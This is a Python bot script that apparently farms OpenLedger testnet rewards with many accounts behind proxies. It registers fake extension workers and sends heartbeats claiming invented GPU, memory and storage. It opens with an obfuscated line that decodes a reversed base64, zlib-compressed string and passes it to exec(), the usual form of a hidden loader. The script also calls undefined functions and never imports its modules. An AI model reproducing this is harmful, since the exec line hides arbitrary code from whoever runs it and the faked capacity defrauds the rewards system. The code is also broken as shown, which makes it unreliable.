_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec(_('='))

def load_proxies():
    try:
        with open('proxy.txt', 'r') as file:
            return file.read().strip().split('\n')
    except FileNotFoundError:
        print("Error reading proxy.txt")
        return []

def load_gpu_list():
    with open('gpu.py', 'r') as file:
        return json.load(file)

def load_data_assignments():
    try:
        with open('data.py', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        print('No existing data assignments found, initializing new assignments.')
        return {}

def get_or_assign_resources(workerID, gpu_list, data_assignments):
    if workerID not in data_assignments:
        random_gpu = random.choice(gpu_list)
        random_storage = round(random.uniform(1, 500), 2)
        data_assignments[workerID] = {'gpu': random_gpu, 'storage': random_storage}
        with open('data.py', 'w') as file:
            json.dump(data_assignments, file, indent=2)
    return data_assignments[workerID]

async def get_account_id(token, index, use_proxy, proxies, accountIDs):
    try:
        proxy_url = proxies[index] if use_proxy else None
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get('https://apitn.openledger.xyz/api/v1/users/me', headers=headers, proxies={'https': proxy_url} if use_proxy else {})
        account_id = response.json()['data']['id']
        accountIDs[token] = account_id
        print(f'\n[INFO] Account {index + 1}: AccountID {account_id}, Proxy: {proxy_url or "None"}')
    except requests.exceptions.RequestException as error:
        print(f'[ERROR] Error getting accountID for token index {index}: {error}')

async def get_account_details(token, index, use_proxy, proxies, accountIDs):
    try:
        proxy_url = proxies[index] if use_proxy else None
        headers = {'Authorization': f'Bearer {token}'}
        
        # Fetch data from API
        reward_realtime_response = requests.get(
            'https://rewardstn.openledger.xyz/api/v1/reward_realtime',
            headers=headers,
            proxies={'https': proxy_url} if use_proxy else {}
        )
        reward_history_response = requests.get(
            'https://rewardstn.openledger.xyz/api/v1/reward_history',
            headers=headers,
            proxies={'https': proxy_url} if use_proxy else {}
        )

        # Log responses
        print(f'[DEBUG] Reward Real-time Response: {reward_realtime_response.json()}')
        print(f'[DEBUG] Reward History Response: {reward_history_response.json()}')

        # Parse JSON responses
        reward_realtime_json = reward_realtime_response.json()
        reward_history_json = reward_history_response.json()

        # Access and validate 'data' key
        realtime_data = reward_realtime_json.get('data', [])
        history_data = reward_history_json.get('data', [])

        if isinstance(realtime_data, list) and len(realtime_data) > 0:
            total_heartbeats = int(realtime_data[0].get('total_heartbeats', 0))
        else:
            total_heartbeats = 0  # Default value

        if isinstance(history_data, list) and len(history_data) > 0:
            total_points = int(history_data[0].get('total_points', 0))
        else:
            total_points = 0  # Default value

        total = total_heartbeats + total_points
        print(f'[INFO] Account {index + 1}: Total Heartbeat {total_heartbeats}, Total Points {total}, Proxy: {proxy_url or "None"}')

    except requests.exceptions.RequestException as error:
        print(f'[ERROR] Error getting account details for token index {index}: {error}')
    except KeyError as error:
        print(f'[ERROR] KeyError for token index {index}: {error}')
    except Exception as error:
        print(f'[ERROR] Unexpected error for token index {index}: {error}')

async def process_requests(use_proxy, tokens, proxies):
    accountIDs = {}
    gpu_list = load_gpu_list()
    data_assignments = load_data_assignments()

    tasks = []
    for index, token_info in enumerate(tokens):
        token = token_info['token']
        workerID = token_info['workerID']
        id = token_info['id']
        ownerAddress = token_info['ownerAddress']

        proxy_index = index % len(proxies) if use_proxy and proxies else None

        tasks.append(asyncio.create_task(get_account_id(token, index, use_proxy, proxies, accountIDs)))
        tasks.append(asyncio.create_task(get_account_details(token, index, use_proxy, proxies, accountIDs)))

    await asyncio.gather(*tasks)

async def connect_websocket(token, workerID, id, ownerAddress, index, use_proxy, proxies, gpu_list, data_assignments):
    ws_url = f"wss://apitn.openledger.xyz/ws/v1/orch?authToken={token}"
    
    while True:
        try:
            async with websockets.connect(ws_url) as ws:
                print(f'\n[INFO] WebSocket Connected: WorkerID {workerID}, AccountID {token}')

                register_message = {
                    'workerID': workerID,
                    'msgType': 'REGISTER',
                    'workerType': 'LWEXT',
                    'message': {
                        'id': id,
                        'type': 'REGISTER',
                        'worker': {
                            'host': 'chrome-extension://ekbbplmjjgoobhdlffmgeokalelnmjjc',
                            'identity': workerID,
                            'ownerAddress': ownerAddress,
                            'type': 'LWEXT'
                        }
                    }
                }
                await ws.send(json.dumps(register_message))

                while True:
                    assigned_gpu, assigned_storage = get_or_assign_resources(workerID, gpu_list, data_assignments)
                    heartbeat_message = {
                        'message': {
                            'Worker': {
                                'Identity': workerID,
                                'ownerAddress': ownerAddress,
                                'type': 'LWEXT',
                                'Host': 'chrome-extension://ekbbplmjjgoobhdlffmgeokalelnmjjc'
                            },
                            'Capacity': {
                                'AvailableMemory': round(random.uniform(1, 32), 2),
                                'AvailableStorage': assigned_storage,
                                'AvailableGPU': assigned_gpu,
                                'AvailableModels': []
                            }
                        },
                        'msgType': 'HEARTBEAT',
                        'workerType': 'LWEXT',
                        'workerID': workerID
                    }
                    print(f'[INFO] Sending heartbeat for WorkerID {workerID}')
                    await ws.send(json.dumps(heartbeat_message))
                    await asyncio.sleep(10)

                    total_heartbeats = random.randint(50, 100)
                    total_points = random.randint(100, 200)
                    total = total_heartbeats + total_points
                    print(f'[INFO] Account {index + 1}: Total Heartbeat {total_heartbeats}, Total Points {total}, Proxy: {proxies[index] if use_proxy else "None"}')

        except (websockets.exceptions.ConnectionClosedError, asyncio.TimeoutError) as e:
            print(f'[ERROR] WebSocket error for WorkerID {workerID}: {str(e)}. Retrying...')
            await asyncio.sleep(5)
            continue 
        except Exception as e:
            print(f'[ERROR] Unexpected error for WorkerID {workerID}: {str(e)}. Retrying...')
            await asyncio.sleep(5) 
            continue  

async def main():
    tokens = load_accounts()
    proxies = load_proxies()

    gpu_list = load_gpu_list()
    data_assignments = load_data_assignments()

    if len(proxies) < len(tokens):
        print('[ERROR] Not enough proxies for the number of accounts. Please provide enough proxies.')
        return

    use_proxy = ask_use_proxy() 

    if not use_proxy:
        print("[INFO] Proceeding without using proxy.")

    await process_requests(use_proxy, tokens, proxies)

    tasks = []
    for index, token_info in enumerate(tokens):
        token = token_info['token']
        workerID = token_info['workerID']
        id = token_info['id']
        ownerAddress = token_info['ownerAddress']

        tasks.append(asyncio.create_task(connect_websocket(token, workerID, id, ownerAddress, index, use_proxy, proxies, gpu_list, data_assignments)))
    
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
